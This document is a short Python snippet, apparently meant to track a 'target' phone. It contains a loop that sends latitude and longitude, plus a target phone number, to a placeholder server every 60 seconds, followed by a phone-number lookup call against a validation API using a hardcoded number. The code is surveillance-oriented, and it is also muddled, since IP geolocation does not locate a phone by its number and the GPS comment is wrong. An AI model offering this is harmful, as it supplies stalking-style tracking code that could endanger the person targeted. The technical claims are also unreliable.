import geocoder
import requests
import time

# Send to your server
def send_location():
    g = geocoder.ip('me')  # or use geocoder.osm('me') for GPS via OS
    location = {
        'latitude': g.latlng[0],
        'longitude': g.latlng[1],
        'number': 'TARGET_PHONE_NUMBER'
    }
    # Replace with your server
    requests.post("https://your-server.com/location", json=location)

while True:
    send_location()
    time.sleep(60)  # Every 60 seconds

import requests

def lookup_number(phone_number):
    api_key = "YOUR_API_KEY"
    url = f"http://apilayer.net/api/validate?access_key={api_key}&number={phone_number}&country_code=&format=1"
    
    response = requests.get(url)
    data = response.json()
    return data

print(lookup_number("+14158586273"))
